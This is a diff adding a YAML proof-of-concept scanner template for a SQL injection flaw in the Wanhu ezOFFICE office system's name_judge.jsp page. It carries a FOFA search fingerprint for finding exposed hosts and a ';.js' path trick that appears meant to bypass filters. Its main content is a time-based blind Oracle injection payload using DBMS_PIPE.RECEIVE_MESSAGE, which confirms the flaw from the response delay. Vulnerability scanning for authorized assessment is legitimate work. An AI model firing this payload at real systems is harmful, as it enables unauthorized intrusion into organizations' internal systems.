@@ -1,0 +1,23 @@
+id: poc-yaml-whir-ezoffice-name-judge-jsp-sqli
+info:
+  name: 万户 ezOFFICE name_judge.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 3
+requests:
+- method: GET
+  path: /
+  expression: status_code == 302 && contains(headers,"/defaultroot")
+- method: POST
+  path: /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: formType=1+AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{{.t1}})--
+  expression: status_code == 200 && trim(body) == "0" && duration > t1 && duration
+    < t2
+transport: http
